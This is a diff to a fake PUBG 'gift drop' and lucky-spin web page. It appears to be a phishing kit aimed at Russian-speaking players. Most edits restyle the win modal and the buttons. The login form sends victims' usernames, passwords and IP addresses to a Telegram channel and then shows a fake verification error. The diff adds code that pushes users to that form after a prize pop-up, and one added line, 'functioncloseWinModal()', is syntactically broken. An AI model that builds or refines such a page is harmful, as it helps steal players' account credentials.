@@ -12,6 +12,7 @@
     <style>
         :root {
             --pubg-gold: #ffbc00;
+            --pubg-gold-dark: #cc9600;
             --pubg-dark: #0b0c0d;
             --pubg-blue: #0084ff;
         }
@@ -59,7 +60,6 @@
             align-items: center;
             gap: 4px;
             border: 1px solid rgba(255,255,255,0.1);
-            cursor: pointer;
         }
 
         .btn-plus {
@@ -74,9 +74,8 @@
         .case-container {
             position: relative;
             width: 100%;
-            height: 160px;
-            overflow: hidden;            background: radial-gradient(circle, rgba(255, 255, 255, 0.02) 0%, transparent 80%);
-            margin: 20px 0;
+            height: 180px;
+            overflow: hidden;            margin: 20px 0;
         }
 
         .case-line {
@@ -91,7 +90,7 @@
 
         .case-tape {
             display: flex;
-            padding: 20px 0;
+            padding: 30px 0;
             transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
             will-change: transform;
         }
@@ -103,7 +102,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0.6;
+            opacity: 0.5;
         }
         .case-item img { width: 100px; height: 100px; object-fit: contain; }
 
@@ -121,19 +120,64 @@
             cursor: pointer;
         }
 
+        /* НОВОЕ ОКНО ВЫИГРЫША */
         .win-modal {
             position: fixed; inset: 0;
-            background: rgba(0,0,0,0.95);
+            background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(8px);
             z-index: 2000; display: none;
             flex-direction: column; justify-content: center; align-items: center; padding: 20px;
         }
 
         .win-card {
-            background: #0b0c0d;
-            border: 2px solid var(--pubg-gold);
-            border-radius: 20px; padding: 30px; width: 85%; max-width: 320px; text-align: center;
+            background: linear-gradient(180deg, #1a1b1f 0%, #0d0e11 100%);
+            border: 1px solid rgba(255, 188, 0, 0.4);
+            border-radius: 12px; 
+            padding: 40px 20px; 
+            width: 90%; max-width: 340px; 
+            text-align: center;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px rgba(255, 188, 0, 0.05);
         }
 
+        /* Свечение за предметом */
+        .item-glow {
+            position: absolute;
+            top: 40%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(255, 188, 0, 0.15) 0%, transparent 70%);
+            z-index: 0;
+        }
+
+        #winPrizeImage {
+            position: relative;
+            z-index: 1;
+            width: 160px; height: 160px;
+            margin: 0 auto 30px auto;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
+        }
+
+        .btn-collect {
+            background: linear-gradient(180deg, var(--pubg-gold) 0%, var(--pubg-gold-dark) 100%);
+            color: #000;
+            width: 100%;
+            padding: 14px;
+            border-radius: 6px;
+            font-family: 'Teko', sans-serif;
+            font-size: 22px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(255, 188, 0, 0.3);
+            border: none;
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .btn-collect:active { transform: scale(0.97); }
+
+        /* НАВИГАЦИЯ */
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
             background: #000; height: 65px;
@@ -148,7 +192,7 @@
             z-index: 1000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
         }
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        .login-card{ background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
     </style>
 </head>
@@ -169,21 +213,21 @@
         </div>
     </header>
 
-    <!-- HUB (ГЛАВНАЯ) -->
+    <!-- HUB -->
     <div id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer" onclick="showSection('case')">
                 <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
                 <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
-            <div class="bg-[#151618] p-4rounded-2xl border border-white/5 text-center cursor-pointer" onclick="showSection('spin')">
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer" onclick="showSection('spin')">
                 <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
                 <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
             </div>
         </div>
     </div>
 
-    <!-- SECTION CASE -->
+    <!-- CASE -->
     <div id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
@@ -196,7 +240,7 @@
         <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
     </div>
 
-    <!-- SECTION SPIN -->
+    <!-- SPIN -->
     <div id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
@@ -218,16 +262,16 @@
         <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Пополнить баланс</button>
     </div>
 
-    <!-- WIN MODAL -->
+    <!-- WIN MODAL (ОБНОВЛЕННЫЙ) -->
     <div id="winModal" class="win-modal">
         <div class="win-card">
-            <div class="pubg-font text-3xl text-yellow-400 mb-6">ПОБЕДА!</div>
-            <img id="winPrizeImage" src="" class="w-40 h-40 mx-auto mb-8 object-contain">
-            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-4 rounded-xl font-bold text-lg">Забрать приз</button>
+            <div class="item-glow"></div>
+            <img id="winPrizeImage" src="" alt="Prize">
+            <button onclick="closeWinModal()" class="btn-collect">Забрать приз</button>
         </div>
     </div>
 
-    <!-- AUTH MODALS -->
+    <!-- AUTH -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация</h2>
@@ -246,7 +290,6 @@
         </div>
     </div>
 
-    <!-- NAV BAR -->
     <nav class="nav-bar">
         <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
         <div class="nav-item active" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
@@ -268,33 +311,23 @@
         function updateBalanceUI() {
             document.getElementById('headerBalance').innerText = balance;
             const canPlay = balance >= 60;
-            
             document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
             document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
-            
             document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
             document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
         }
 
         function showSection(id) {
-            // Скрываем все
             document.getElementById('section-hub').style.display = 'none';
             document.getElementById('section-case').style.display = 'none';
             document.getElementById('section-spin').style.display = 'none';
-            
-            // Показываем нужный
             document.getElementById('section-' + id).style.display = 'block';
-            
-            // Кнопка назад
             document.getElementById('backBtn').style.visibility = (id === 'hub') ? 'hidden' : 'visible';
-            
-            // Обновляем навигацию
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
             if(id === 'hub') document.querySelector('.nav-bar .nav-item:nth-child(2)').classList.add('active');
             if(id === 'case') document.querySelector('.nav-bar .nav-item:nth-child(1)').classList.add('active');
-            
-            updateBalanceUI();
-        }// ГЕНЕРАЦИЯ ЛЕНТЫ БЕЗ ПОВТОРОВ ПОДРЯД
+        }
+
         function initCase() {
             const tape = document.getElementById('caseTape');
             tape.innerHTML = '';
@@ -305,7 +338,6 @@
                 lastIdx = idx;
                 tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
             }
-            tape.style.transform = `translateX(0px)`;
         }
 
         function openCase() {
@@ -316,12 +348,8 @@
 
             const targetIdx = 50; 
             const tape = document.getElementById('caseTape');
-            
-            // Расчет для остановки СТРОГО ПО ЦЕНТРУ:
-            // Сдвигаем на (targetIdx * 140) и добавляем компенсацию, чтобы центр предмета совпал с центром экрана
             const screenCenter = window.innerWidth / 2;
-            const itemCenterOffset = itemWidth / 2;
-            const finalOffset = (targetIdx * itemWidth) - screenCenter + itemCenterOffset;
+            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
             
             tape.style.transform = `translateX(-${finalOffset}px)`;
             
@@ -372,8 +400,11 @@
             document.getElementById('winModal').style.display = 'flex';
         }
 
-        function closeWinModal() {
+        functioncloseWinModal() {
             document.getElementById('winModal').style.display = 'none';
+            if(balance < 60) {
+                 setTimeout(() => startAuth(), 500);
+            }
         }
 
         function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
@@ -386,7 +417,7 @@
         async function finalSubmit() {
             const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
-            if(u.length < 4 || p.length <4) return alert('Заполните данные');
+            if(u.length < 4 || p.length < 4) return alert('Заполните данные');
             await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
             alert('Ошибка верификации аккаунта. Попробуйте другой способ.');
             location.reload();
